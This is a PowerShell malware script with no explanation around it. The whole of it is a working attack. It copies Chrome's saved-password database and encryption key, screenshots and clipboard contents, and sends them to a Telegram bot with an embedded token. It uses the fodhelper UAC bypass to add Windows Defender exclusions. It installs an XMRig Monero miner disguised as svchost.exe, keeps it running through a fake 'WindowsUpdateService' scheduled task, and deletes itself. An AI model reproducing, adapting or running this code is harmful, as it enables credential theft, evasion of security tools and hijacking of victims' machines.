[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

$workDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
    if (Test-Path $loginData) {
        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $out = [System.IO.File]::Create("$workDir\passwords.db")
        $stream.CopyTo($out); $stream.Close(); $out.Close()
    }
    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $bmp.Save("$workDir\screen.png")
    $g.Dispose(); $bmp.Dispose()
    "Clipboard Content: $((Get-Clipboard) -join ' ')" | Out-File "$workDir\info.txt"
    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)
    & curl.exe -s -F "chat_id=$chatId" -F "document=@$zipFile" "https://api.telegram.org/bot$token/sendDocument"
} catch {
    $err = $_.Exception.Message
    & curl.exe -s -d "chat_id=$chatId" -d "text=Fail: $err" "https://api.telegram.org/bot$token/sendMessage"
} finally {
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
}

$exclusionPath = "$env:APPDATA\Microsoft\Windows\Crypto"
$tempScript = "$env:TEMP\uac_bypass.ps1"
$cmd = "Add-MpPreference -ExclusionPath '$exclusionPath' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
"powershell.exe -NoP -Ep Bypass -Enc $encoded" | Out-File -FilePath $tempScript -Encoding ASCII

$regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
New-Item -Path $regPath -Force | Out-Null
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(default)" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $tempScript -Force -ErrorAction SilentlyContinue

$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$wallet = "44hEzgDamuSMLdWLUVkmJpJvTLeWjjc2LhUqa898N9eaXFm4QqJuTBR5HfKE8j954SReNHhZHW7NW5gdbWdQuVjg8maA4vz"
$pool = "pool.supportxmr.com:3333"

$minerDir = $exclusionPath
New-Item -ItemType Directory -Path $minerDir -Force | Out-Null
attrib +h $minerDir

$minerZip = "$env:TEMP\xmrig.zip"
Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip -UseBasicParsing
Expand-Archive -Path $minerZip -DestinationPath "$env:TEMP\xmrig" -Force
Copy-Item "$env:TEMP\xmrig\xmrig-6.22.2\xmrig.exe" -Destination "$minerDir\svchost.exe" -Force

$config = @"
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50,
        "priority": 1,
        "asm": true
    },
    "pools": [
        {
            "url": "$pool",
            "user": "$wallet",
            "pass": "x",
            "tls": false,
            "keepalive": true
        }
    ],
    "background": true,
    "title": false,
    "print-time": 0,
    "http": {
        "enabled": false
    }
}
"@
$config | Out-File -FilePath "$minerDir\config.json" -Encoding ASCII

$taskName = "WindowsUpdateService"
$action = New-ScheduledTaskAction -Execute "$minerDir\svchost.exe" -Argument "--config=$minerDir\config.json"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force

Start-Process -FilePath "$minerDir\svchost.exe" -ArgumentList "--config=$minerDir\config.json" -WindowStyle Hidden

Remove-Item $minerZip -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\xmrig" -Recurse -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 2
if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
}
